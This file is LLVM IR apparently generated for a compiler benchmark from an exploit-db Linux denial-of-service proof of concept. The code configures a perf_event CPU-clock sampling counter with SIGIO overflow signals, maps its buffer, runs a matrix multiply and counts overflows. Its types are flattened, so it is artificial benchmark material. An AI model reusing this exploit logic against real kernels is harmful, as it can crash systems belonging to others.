; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_17769.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_17769.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.perf_event_attr = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%struct.sigaction = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }

@our_handler = common dso_local global i32 0, align 4
@SA_SIGINFO = common dso_local global i32 0, align 4
@SIGIO = common dso_local global i32 0, align 4
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [33 x i8] c"Error setting up signal handler\0A\00", align 1
@PERF_TYPE_SOFTWARE = common dso_local global i32 0, align 4
@PERF_COUNT_SW_CPU_CLOCK = common dso_local global i32 0, align 4
@PERF_SAMPLE_IP = common dso_local global i32 0, align 4
@PERF_FORMAT_GROUP = common dso_local global i32 0, align 4
@PERF_FORMAT_ID = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [15 x i8] c"Error opening\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@MAP_SHARED = common dso_local global i32 0, align 4
@F_SETFL = common dso_local global i32 0, align 4
@O_RDWR = common dso_local global i32 0, align 4
@O_NONBLOCK = common dso_local global i32 0, align 4
@O_ASYNC = common dso_local global i32 0, align 4
@F_SETSIG = common dso_local global i32 0, align 4
@F_SETOWN = common dso_local global i32 0, align 4
@PERF_EVENT_IOC_RESET = common dso_local global i32 0, align 4
@PERF_EVENT_IOC_ENABLE = common dso_local global i32 0, align 4
@PERF_EVENT_IOC_DISABLE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c"Total overflows: %d\0A\00", align 1
@total = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca %struct.perf_event_attr, align 4
  %9 = alloca %struct.sigaction, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %10 = call i32 @memset(%struct.sigaction* %9, i32 0, i32 52)
  %11 = load i32, i32* @our_handler, align 4
  %12 = getelementptr inbounds %struct.sigaction, %struct.sigaction* %9, i32 0, i32 12
  store i32 %11, i32* %12, align 4
  %13 = load i32, i32* @SA_SIGINFO, align 4
  %14 = getelementptr inbounds %struct.sigaction, %struct.sigaction* %9, i32 0, i32 11
  store i32 %13, i32* %14, align 4
  %15 = load i32, i32* @SIGIO, align 4
  %16 = call i64 @sigaction(i32 %15, %struct.sigaction* %9, i32* null)
  %17 = icmp slt i64 %16, 0
  br i1 %17, label %18, label %22

18:                                               ; preds = %2
  %19 = load i32, i32* @stderr, align 4
  %20 = call i32 @fprintf(i32 %19, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str, i64 0, i64 0))
  %21 = call i32 @exit(i32 1) #3
  unreachable

22:                                               ; preds = %2
  %23 = bitcast %struct.perf_event_attr* %8 to %struct.sigaction*
  %24 = call i32 @memset(%struct.sigaction* %23, i32 0, i32 52)
  %25 = load i32, i32* @PERF_TYPE_SOFTWARE, align 4
  %26 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 10
  store i32 %25, i32* %26, align 4
  %27 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 0
  store i32 52, i32* %27, align 4
  %28 = load i32, i32* @PERF_COUNT_SW_CPU_CLOCK, align 4
  %29 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 9
  store i32 %28, i32* %29, align 4
  %30 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 1
  store i32 100000, i32* %30, align 4
  %31 = load i32, i32* @PERF_SAMPLE_IP, align 4
  %32 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 8
  store i32 %31, i32* %32, align 4
  %33 = load i32, i32* @PERF_FORMAT_GROUP, align 4
  %34 = load i32, i32* @PERF_FORMAT_ID, align 4
  %35 = or i32 %33, %34
  %36 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 2
  store i32 %35, i32* %36, align 4
  %37 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 3
  store i32 1, i32* %37, align 4
  %38 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 4
  store i32 1, i32* %38, align 4
  %39 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 5
  store i32 1, i32* %39, align 4
  %40 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 6
  store i32 1, i32* %40, align 4
  %41 = getelementptr inbounds %struct.perf_event_attr, %struct.perf_event_attr* %8, i32 0, i32 7
  store i32 1, i32* %41, align 4
  %42 = bitcast %struct.perf_event_attr* %8 to %struct.sigaction*
  %43 = call i32 @perf_event_open(%struct.sigaction* %42, i32 0, i32 -1, i32 -1, i32 0)
  store i32 %43, i32* %6, align 4
  %44 = load i32, i32* %6, align 4
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %48

46:                                               ; preds = %22
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.1, i64 0, i64 0))
  br label %48

48:                                               ; preds = %46, %22
  %49 = load i32, i32* @PROT_READ, align 4
  %50 = load i32, i32* @PROT_WRITE, align 4
  %51 = or i32 %49, %50
  %52 = load i32, i32* @MAP_SHARED, align 4
  %53 = load i32, i32* %6, align 4
  %54 = call i8* @mmap(i32* null, i32 12288, i32 %51, i32 %52, i32 %53, i32 0)
  store i8* %54, i8** %7, align 8
  %55 = load i32, i32* %6, align 4
  %56 = load i32, i32* @F_SETFL, align 4
  %57 = load i32, i32* @O_RDWR, align 4
  %58 = load i32, i32* @O_NONBLOCK, align 4
  %59 = or i32 %57, %58
  %60 = load i32, i32* @O_ASYNC, align 4
  %61 = or i32 %59, %60
  %62 = call i32 @fcntl(i32 %55, i32 %56, i32 %61)
  %63 = load i32, i32* %6, align 4
  %64 = load i32, i32* @F_SETSIG, align 4
  %65 = load i32, i32* @SIGIO, align 4
  %66 = call i32 @fcntl(i32 %63, i32 %64, i32 %65)
  %67 = load i32, i32* %6, align 4
  %68 = load i32, i32* @F_SETOWN, align 4
  %69 = call i32 (...) @getpid()
  %70 = call i32 @fcntl(i32 %67, i32 %68, i32 %69)
  %71 = load i32, i32* %6, align 4
  %72 = load i32, i32* @PERF_EVENT_IOC_RESET, align 4
  %73 = call i32 @ioctl(i32 %71, i32 %72, i32 0)
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* @PERF_EVENT_IOC_ENABLE, align 4
  %76 = call i32 @ioctl(i32 %74, i32 %75, i32 0)
  %77 = call i32 @naive_matrix_multiply(i32 0)
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* @PERF_EVENT_IOC_DISABLE, align 4
  %80 = call i32 @ioctl(i32 %78, i32 %79, i32 0)
  %81 = load i8*, i8** %7, align 8
  %82 = call i32 @munmap(i8* %81, i32 12288)
  %83 = load i32, i32* %6, align 4
  %84 = call i32 @close(i32 %83)
  %85 = load i32, i32* @total, align 4
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0), i32 %85)
  ret i32 0
}

declare dso_local i32 @memset(%struct.sigaction*, i32, i32) #1

declare dso_local i64 @sigaction(i32, %struct.sigaction*, i32*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @perf_event_open(%struct.sigaction*, i32, i32, i32, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i8* @mmap(i32*, i32, i32, i32, i32, i32) #1

declare dso_local i32 @fcntl(i32, i32, i32) #1

declare dso_local i32 @getpid(...) #1

declare dso_local i32 @ioctl(i32, i32, i32) #1

declare dso_local i32 @naive_matrix_multiply(i32) #1

declare dso_local i32 @munmap(i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
